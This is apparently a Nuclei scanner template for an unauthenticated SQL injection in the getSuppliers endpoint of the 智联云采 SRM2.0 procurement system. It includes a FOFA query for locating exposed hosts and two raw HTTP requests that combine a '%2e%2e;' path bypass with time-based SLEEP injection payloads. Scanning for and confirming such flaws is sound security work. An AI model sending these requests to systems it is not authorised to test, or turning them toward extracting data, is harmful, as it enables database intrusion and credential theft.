id: zhilianyuncai-SRM2-getSuppliers-sql

info:
  name: "智联云采 SRM2.0 getSuppliers 接口 SQL 注入漏洞"
  author: Unknown
  severity: high
  description: |-
    fofa: title=="SRM 2.0"
      智联云采SRM2.0系统中getSuppliers接口存在SQL注入安全缺陷。攻击者无需身份验证即可通过构造恶意SQL语句，实现对后台数据库的未授权访问，可提取敏感数据（包括但不限于用户凭证信息），并可能进一步扩展为服务器控制权限的获取。
  reference:
  - https://mp.weixin.qq.com/s/u58kW_FlgiS5S90cRbFyWA?token=827319261&lang=zh_CN
  tags: 智联云采

http:
- raw:
  - |
    POST /adpweb/static/%2e%2e;/a/srm/inquiry/getSuppliers?code=%27+AND+%28SELECT+1312+FROM+%28SELECT%28SLEEP%282%29%29%29HckV%29--+HyuV HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

  - |
    POST /adpweb/static/%2e%2e;/a/srm/inquiry/getSuppliers?code=%27+AND+%28SELECT+1312+FROM+%28SELECT%28SLEEP%284%29%29%29HckV%29--+HyuV HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  matchers:
  - type: dsl
    dsl:
    - 'duration_1>=4 && duration_1<=5'
    - 'duration_2>=8 && duration_2<=9'
    condition: and

